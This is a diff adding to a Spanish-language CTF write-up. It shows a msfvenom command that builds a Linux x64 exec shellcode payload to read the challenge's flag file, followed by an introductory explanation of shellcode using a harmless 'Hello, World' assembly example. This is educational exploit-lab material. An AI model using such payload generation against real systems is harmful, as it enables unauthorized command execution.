@@ -83,12 +83,60 @@ FLAG:e8864c381822ec7cf97f5516745411f5
 $  [*] Got EOF while reading in interactive
 ```
 
-Luego descubrí que hay otra manera más sencilla usando el payload de 64 bits de metasploit siguiente:
+Luego descubrí que hay otra manera más sencilla usando el payload de 64 bits de metasploit que te permite ejecutar un comando:
 
 ```
 msfvenom -p linux/x64/exec CMD="cat /home/ctf/flag.txt" -n 16 -b '\x00\x20\x0d\x0a' -f python
 ```
 
+#### Teoría básica de shellcodes
+
+¿Qué son estos shellcodes? 
+
+El shellcode no es más que los opcodes de las instrucciones de lenguaje ensamblador. Hagamos un ejemplo con el clásico "Hola mundo" en ensamblador:
+
+```
+global _start
+
+section .text
+
+_start:
+    jmp MESSAGE      ; 1) lets jump to MESSAGE
+
+GOBACK:
+    mov eax, 0x4
+    mov ebx, 0x1
+    pop ecx          ; 3) we are poping into `ecx`, now we have the
+                     ; address of "Hello, World!\r\n" 
+    mov edx, 0xF
+    int 0x80
+
+    mov eax, 0x1
+    mov ebx, 0x0
+    int 0x80
+
+MESSAGE:
+    call GOBACK       ; 2) we are going back, since we used `call`, that means
+                      ; the return address, which is in this case the address 
+                      ; of "Hello, World!\r\n", is pushed into the stack.
+    db "Hello, World!", 0dh, 0ah
+
+```
+
+En este código se utiliza el clásico jmp-ret para dejar en la pila la dirección de memoria de la variable a la que queremos acceder. En este caso "Hello, World!". Está explicado este método en los comentarios. 
+
+
+¿Cómo se genera?
+
+Una vez que tenemos el código ensamblador, lo compilamos y creamos el ejecutable:
+
+```
+nasm -f elf hello.asm
+ld -o hello hello.o
+
+./hello 
+Hello, World!
+```
 
 
 
